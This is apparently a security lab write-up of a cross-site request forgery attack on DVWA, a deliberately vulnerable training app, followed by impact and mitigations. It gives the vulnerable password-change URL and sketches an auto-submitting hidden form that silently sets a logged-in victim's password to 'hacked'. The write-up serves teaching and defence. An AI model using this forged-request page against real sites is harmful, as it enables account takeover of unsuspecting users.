# Cross-Site Request Forgery (CSRF) Write-Up

## Overview

| Field | Details |
|-------|---------|
| Vulnerability | CSRF |
| Severity | High |
| CVSS Score | 8.0 |
| Target | DVWA on AWS EC2 |
| Security Level | Low |

## What Is CSRF?

CSRF tricks an authenticated user browser into sending an unintended request. The server cannot distinguish it from a legitimate request because the browser sends session cookies automatically.

## Steps to Reproduce

### Step 1: Observe the Request
Submit a normal password change and observe the URL:
http://[target]/dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change

No CSRF token present. Any page that loads this URL while the user is logged in will change their password.

### Step 2: Craft the Attack Page
Create csrf_attack.html:

html body onload form submit
form action http://[target]/dvwa/vulnerabilities/csrf/ method GET
input type hidden name password_new value hacked
input type hidden name password_conf value hacked
input type hidden name Change value Change
/form /body /html

### Step 3: Execute
Open csrf_attack.html while logged into DVWA. Form auto-submits. Password silently changed to hacked with no warning to the victim.

## Impact
- Attacker silently locks victim out of their account
- Any authenticated action can be forged
- No credentials required

## Mitigations
- Add CSRF tokens to all state-changing forms
- Set SameSite=Strict on session cookies
- Use POST not GET for state-changing actions
- Require re-authentication for sensitive changes
- Validate Origin and Referer headers

## References
- https://owasp.org/www-community/attacks/csrf
- https://cwe.mitre.org/data/definitions/352.html
